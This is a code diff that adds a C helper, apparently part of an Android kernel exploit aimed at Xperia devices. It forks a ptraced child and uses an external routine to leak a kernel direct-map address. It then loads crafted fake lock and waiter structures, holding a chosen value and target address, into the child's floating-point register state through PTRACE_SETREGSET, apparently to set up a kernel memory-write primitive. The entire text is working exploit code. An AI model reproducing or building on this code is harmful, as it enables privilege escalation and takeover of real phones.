@@ -959,3 +959,81 @@ unsigned long env_ulong(const char *name, unsigned long def) {
   if (!v) return def;
   return strtoul(v, NULL, 0);
 }
+
+// === Xperia FPU yontemi (JoinChang entegrasyonu) ===
+#ifndef FP_STATE_OFF
+#define FP_STATE_OFF 0xc00ULL
+#endif
+#define FP_STATE_LEN 0x208
+#define FP_LOCK_OFF  0x000ULL
+#define FP_W_OFF     0x040ULL
+
+extern uintptr_t perf_find_task(void);
+
+uintptr_t fp_helper_setup(uintptr_t value, uintptr_t target, pid_t *out_pid) {
+  size_t pg = 4096;
+  volatile uint64_t *sh = mmap(NULL, pg, PROT_READ | PROT_WRITE,
+                               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (sh == MAP_FAILED) return 0;
+  *sh = 0;
+  pid_t c = fork();
+  if (c == 0) {
+    uint64_t dm = perf_find_task();
+    *sh = dm;
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) _exit(3);
+    raise(SIGSTOP);
+    _exit(0);
+  }
+  if (c < 0) { munmap((void *)sh, pg); return 0; }
+  int st = 0;
+  int stopped = 0;
+  for (int i = 0; i < 300; i++) {
+    pid_t r = waitpid(c, &st, WUNTRACED);
+    if (r == c) { stopped = (WIFSTOPPED(st) != 0); break; }
+    if (r < 0) break;
+    usleep(10000);
+  }
+  uint64_t dm = *sh;
+  munmap((void *)sh, pg);
+  if (!stopped || !dm || dm < P0_PAGE_OFFSET || dm >= DIRECT_MAP_END ||
+      (dm & 7)) {
+    pr_warning("fp helper: stopped=%d dm=%016llx status=%#x\n", stopped,
+               (unsigned long long)dm, st);
+    if (c > 0) { kill(c, SIGKILL); waitpid(c, &st, 0); }
+    return 0;
+  }
+  uintptr_t lock = (uintptr_t)dm + FP_STATE_OFF + FP_LOCK_OFF;
+  uintptr_t w = (uintptr_t)dm + FP_STATE_OFF + FP_W_OFF;
+  unsigned char fp[FP_STATE_LEN];
+  memset(fp, 0, sizeof(fp));
+  put32(fp, FP_LOCK_OFF + 0x00, 0);
+  put64(fp, FP_LOCK_OFF + 0x08, w);
+  put64(fp, FP_LOCK_OFF + 0x10, w);
+  put64(fp, FP_LOCK_OFF + 0x18, dm | 1);
+  put64(fp, FP_W_OFF + 0x00, 1);
+  put64(fp, FP_W_OFF + 0x08, 0);
+  put64(fp, FP_W_OFF + 0x10, 0);
+  put64(fp, FP_W_OFF + 0x18, value);
+  put64(fp, FP_W_OFF + 0x20, 0);
+  put64(fp, FP_W_OFF + 0x28, target);
+  put64(fp, FP_W_OFF + 0x30, 0);
+  put64(fp, FP_W_OFF + 0x38, lock);
+  put32(fp, FP_W_OFF + 0x40, 130);
+  put64(fp, FP_W_OFF + 0x48, 0);
+  struct iovec iov;
+  iov.iov_base = fp;
+  iov.iov_len = sizeof(fp);
+  errno = 0;
+  long r = ptrace(PTRACE_SETREGSET, c, (void *)(long)2, &iov);
+  if (r != 0) {
+    pr_warning("fp helper: SETREGSET errno=%d len=%zu\n", errno, iov.iov_len);
+    kill(c, SIGKILL);
+    waitpid(c, &st, 0);
+    return 0;
+  }
+  *out_pid = c;
+  pr_info("fp helper: pid=%d dm=%016zx lock=%016zx w=%016zx value=%016zx "
+          "target=%016zx\n", (int)c, (size_t)dm, (size_t)lock, (size_t)w,
+          (size_t)value, (size_t)target);
+  return lock;
+}
